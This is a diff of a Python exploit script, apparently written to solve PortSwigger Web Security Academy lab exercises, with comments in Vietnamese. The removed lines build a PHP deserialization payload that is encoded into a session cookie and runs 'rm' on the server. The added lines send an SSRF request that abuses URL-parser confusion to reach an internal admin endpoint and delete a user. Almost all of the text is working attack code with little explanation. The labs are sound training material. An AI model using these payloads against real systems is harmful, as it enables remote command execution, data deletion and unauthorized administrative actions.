@@ -4,39 +4,22 @@ import re
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from bs4 import BeautifulSoup
-import base64
-from urllib.parse import quote
 
-url = 'https://0a4400490495946f85c3ad2e001000d0.web-security-academy.net'
+url = 'https://0a9d00030370c23b83e866f5002900e0.web-security-academy.net'
 
 session = requests.Session()
 
-# Đăng nhập 
-data_login = {
-    'username': 'wiener',
-    'password': 'peter',
+headers = {
+    'Host': '0a9d00030370c23b83e866f5002900e0.web-security-academy.net',
+    'Content-Type': 'application/x-www-form-urlencoded',
 }
 
+data_url = 'stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos'
 
 response = requests.post(
-    url + "/login",
-    data = data_login,
-)
-
-# lấy data từ cookie và xử lí
-data_cookies = 'O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}'
-encode_base64 = base64.b64encode(data_cookies.encode('utf-8')).decode('utf-8')
-encode_url = quote(encode_base64)
-solve = encode_url
-
-cookies = {
-    'session': solve,
-}
-
-# dùng cookie đã sử lý để xóa carlos
-response = requests.get(
-    url + '/product?productId=1',
-    cookies=cookies,   
+    url + '/product/stock',
+    headers=headers,
+    data=data_url,
     verify=False,
 )
 
